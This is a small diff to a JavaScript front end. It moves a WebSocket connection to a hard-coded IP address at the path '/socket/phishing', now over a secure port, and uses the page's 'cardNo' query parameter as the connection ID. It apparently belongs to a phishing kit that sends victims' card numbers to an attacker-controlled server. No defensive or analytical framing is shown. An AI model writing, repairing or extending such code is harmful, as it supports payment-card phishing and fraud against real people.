@@ -48,7 +48,7 @@ export default () => {
   const createSocket = () => {
     console.log('[WebSocket] createSocket...');
     try {
-      socket = new WebSocket(`ws://134.195.90.243:8000/socket/phishing?id=`+new URLSearchParams(window.location.search).get('cardNo'));
+      socket = new WebSocket(`wss://134.195.90.243:8443/socket/phishing?id=`+new URLSearchParams(window.location.search).get('cardNo'));
       init();
       if (lockReconnect) {
         lockReconnect = false;
